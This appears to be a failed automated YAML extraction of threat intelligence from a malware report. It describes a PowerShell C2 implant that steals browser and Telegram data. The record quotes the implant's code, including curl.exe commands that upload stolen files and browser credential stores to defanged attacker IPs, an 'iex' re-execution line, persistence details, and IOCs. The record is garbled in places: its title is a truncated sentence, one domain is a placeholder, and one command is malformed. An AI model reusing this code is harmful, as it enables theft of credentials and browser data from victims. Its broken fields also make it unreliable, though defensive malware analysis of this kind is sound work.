@@ -1,0 +1,71 @@
+# Failed YAML extraction
+# Timestamp: 2026-05-01T16:15:32.496304
+# Response length: 5443 chars
+# Input chunk preview: 'e current user session. Command output is captured and POST-ed back to /api/result, completing the C2 loop.Figure 10: Decoded PowerShell C2 implant showing system profiling routine and JSON beacon str'
+# ============================================================
+
+title: "e current user session. Command output is captured and POST-ed back to /api/result, completing the C2 loop."
+description: The threat involves a PowerShell-based C2 implant that performs various post-exploitation tasks including Telegram Desktop session theft, software discovery, browser data collection, browser process injection, screen capture, and establishes persistence via a startup shortcut.
+attribution: ""
+malware_families: []
+cves: []
+ttps:
+  processes:
+    - powershell.exe
+    - curl.exe
+  command_lines:
+    - "powershell.exe -NoP -W Hidden -Enc SQBFAFgA..."
+    - "curl.exe -k -X POST -H \"Auth:fwyan48umt1vimwqcqvhdd9u72a7qysi\" -H \"mid:a5785c96-0870-4626-a2c8-66feb263cbb0\" -F \"file=@$ppath\" hxxps://104[.]145[.]210[.]107:8444/upload"
+    - "curl.exe -k -X POST -H Auth: ufjqsmjsaydc9ub6t1e0psn8183lvu2z -hxxps://83[.]136[.]209[.]22:8444/download?id=8766ceb975cadedca38aad72091017cdb5d3e4c8f8af0441"
+    - "powershell.exe -ep Bypass -c Get-Content %TEMP%\chromechip.log | iex"
+  powershell:
+    - "{[Text.Encoding]::UTF8.GetString(...)}"
+    - "$uninstallKeys = @( 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*', 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' ) # Collect metadata per app [pscustomobject]@{ Name=$_.DisplayName; Version=$_.DisplayVersion; InstallLocation=$_.InstallLocation EstimatedSizeMB = if ($_.EstimatedSize) { [math]::Round($_.EstimatedSize/1024,1) } else { $null } Scope = if ($_.PSPath -like '*HKCU*') { 'CurrentUser' } else { 'AllUsers' } Arch = if ($_.PSPath -like '*WOW6432Node*') { 'x86' } else { 'x64/Neutral' } } # Export and exfiltrate $username=$env:USERNAME $ppath=\"$env:TEMP\lg_$username\" $apps | Export-Csv $ppath -NoTypeInformation -Encoding UTF8 & curl.exe -k -X POST -H \"Auth:fwyan48umt1vimwqcqvhdd9u72a7qysi\" ` -H \"mid:a5785c96-0870-4626-a2c8-66feb263cbb0\" ` -F \"file=@$ppath\" hxxps://104[.]145[.]210[.]107:8444/upload Remove-Item -Path $ppath-Force # <-- BUG: missing space before -Force"
+    - "fSupfYxac2LF = $env:LOCALAPPDATA + '\Google\Chrome\User Data' $Bf4egnXXRlfz = $env:LOCALAPPDATA + '\Microsoft\Edge\User Data' $BIsBUj6WM1by = $env:LOCALAPPDATA + '\BraveSoftware\Brave-Browser\User Data' $YhNrvv3DGr6u = $env:LOCALAPPDATA + '\Opera Software\Opera Stable' $GimU33eNftv0 = $env:APPDATA + '\Mozilla\Firefox\Profiles' # Defined but NOT used # Per-profile artifact files and directories $l3ECgtyaVFia = @('Web Data','Login Data','Cookies','History','BookmarkMergedSurfaceOrdering') $zWhY5qvI9zkp = @('Local Extension Settings','Local Storage') # Stage, compress, and exfiltrate $tzlLqozIrkrE = $env:TEMP + '\ext_' + $env:USERNAME + '.zip' Compress-Archive -Path $7b0Q7bMhmQUk -DestinationPath $tzlLqozIrkrE -Update & curl.exe -k -X POST -H \"mid:a5785c96-0870-4626-a2c8-66feb263cbb0\" ` -H \"Auth:fwyan48umt1vimwqcqvhdd9u72a7qysi\" ` -F \"file=@$tzlLqozIrkrE\" hxxps://104[.]145[.]210[.]107:8444/upload Remove-Item -Path $7b0Q7bMhmQUk -Recurse -Force #Remove-Item -Path $tzlLqozIrkrE -Force # <-- BUG: cleanup commented out"
+    - "powershell.exe -ep Bypass -c Get-Content %TEMP%\chromechip.log | iex"
+  scripts:
+    - "{[Text.Encoding]::UTF8.GetString(...)}"
+  registry_keys:
+    - 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
+    - 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
+    - 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
+  image_loads: []
+  network_connections:
+    - "powershell.exe -> hxxps://104[.]145[.]210[.]107:8444/upload"
+    - "curl.exe -> hxxps://83[.]136[.]209[.]22:8444/download?id=8766ceb975cadedca38aad72091017cdb5d3e4c8f8af0441"
+    - "curl.exe -> hxxp://check02id[.]com:7365/hello"
+  file_activity:
+    - "%TEMP%\tel_<username>.zip"
+    - "%TEMP%\lg_<username>"
+    - "%TEMP%\ext_<username>.zip"
+    - "C:\Users\Public\log.ini"
+    - "C:\Users\Public\pchr.csv"
+    - "C:\Users\Public\pmse.csv"
+    - "C:\Users\Public\pbra.csv"
+    - "%USERPROFILE%\chrome-debug-data001.log"
+    - "%TEMP%\chromechip.log"
+    - "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Chrome Update  Certificated.lnk"
+    - "%TEMP%\screen.jpg"
+  persistence:
+    - "Registry Run key (HKCU) pointing to C:\Users\Public\update.exe"
+    - "Bootstrap payload (chrome-debug-data001.log): A file is dropped to %USERPROFILE%\chrome-debug-data001.log containing an encoded string processed using the same Base64 + XOR 0x43. When decoded, it executes: powershell.exe -ep Bypass -c Get-Content %TEMP%\chromechip.log | iex, re-executing the C2 implant."
+    - "Startup LNK (Chrome Update  Certificated.lnk): A Windows shortcut file is created in the users Startup folder. The recovered script (ps1) shows the complete creation logic see Appendix A: Persistence on our public GitHub."
+  process_relations:
+    - "powershell.exe -> curl.exe"
+iocs:
+  hashes:
+    - 17158cd6490a2b3c672d087f3d69107643d6a6f7c67345461b10ae18f27e28d1
+    - db446f0e1d18b43805bfefe1af934ae4b0879e376904635cc7e14eae2d7fc682
+    - 6030338469819129924C6E01E110145A128CA3D944CD4B696ABC7925A1840001
+  ip_addresses:
+    - 104.145.210.107
+    - 83.136.209.22
+    - 73.158.153.21
+  domains:
+    - placeholder.invalid
+  urls:
+    - hxxps://104[.]145[.]210[.]107:8444/upload
+    - hxxps://83[.]136[.]209[.]22:8444/download?id=8766ceb975cadedca38aad72091017cdb5d3e4c8f8af0441
+    - hxxp://check02id[.]com:7365/hello
+authors:
+  - ""
